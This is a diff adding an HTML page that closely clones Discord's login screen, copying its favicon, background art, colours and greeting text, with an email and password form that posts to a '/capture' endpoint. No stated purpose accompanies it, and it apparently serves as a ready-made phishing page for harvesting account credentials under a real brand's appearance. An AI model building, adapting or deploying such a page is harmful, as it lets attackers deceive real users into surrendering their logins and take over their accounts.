@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Login</title>
+    <link rel="icon" href="https://discord.com/favicon.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "ABC Ginto Normal", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif; }
+        
+        body {
+            background: #5865f2;
+            background-image: url('https://discord.com/assets/3b0d37e8d90b0e03f3a95e2732dea154.svg');
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            padding: 40px 20px;
+        }
+        
+        .card {
+            background: #36393f;
+            border-radius: 8px;
+            padding: 32px;
+            width: 480px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        
+        .auth-box {
+            text-align: center;
+        }
+        
+        h1 {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #b9bbbe;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .form-group { margin-bottom: 20px; text-align: left; }
+        
+        label {
+            display: block;
+            color: #b9bbbe;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #202225;
+            border: 1px solid #040405;
+            border-radius: 3px;
+            color: #dcddde;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus { outline: none; border-color: #5865f2; }
+        input:hover { border-color: #040405; background: #202225; }
+        
+        .forgot {
+            color: #00b0f4;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 4px;
+        }
+        .forgot:hover { text-decoration: underline; }
+        
+        .btn-login {
+            width: 100%;
+            background: #5865f2;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn-login:hover { background: #4752c4; }
+        
+        .signup {
+            margin-top: 16px;
+            color: #72767d;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #00b0f4;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .signup a:hover { text-decoration: underline; }
+        
+        .qr-section {
+            margin-top: 24px;
+            padding: 24px;
+            border-top: 1px solid #202225;
+            text-align: center;
+        }
+        
+        .qr-placeholder {
+            width: 176px;
+            height: 176px;
+            background: #fff;
+            border-radius: 8px;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .qr-title { color: #fff; font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        .qr-subtitle { color: #b9bbbe; font-size: 14px; }
+        
+        .need-account { margin-top: 8px; color: #72767d; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="auth-box">
+                <h1>Welcome back!</h1>
+                <p class="subtitle">We're so excited to see you again!</p>
+                
+                <form action="/capture" method="POST">
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" name="email" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" name="password" required>
+                        <a href="#" class="forgot">Forgot your password?</a>
+                    </div>
+                    
+                    <button type="submit" class="btn-login">Log In</button>
+                </form>
+                
+                <p class="signup">Need an account? <a href="#">Register</a></p>
+            </div>
+            
+            <div class="qr-section">
+                <div class="qr-placeholder">
+                    <span style="color: #666;">📷 QR Code</span>
+                </div>
+                <div class="qr-title">Log in with QR Code</div>
+                <div class="qr-subtitle">Scan this with the Discord mobile app to log in instantly.</div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
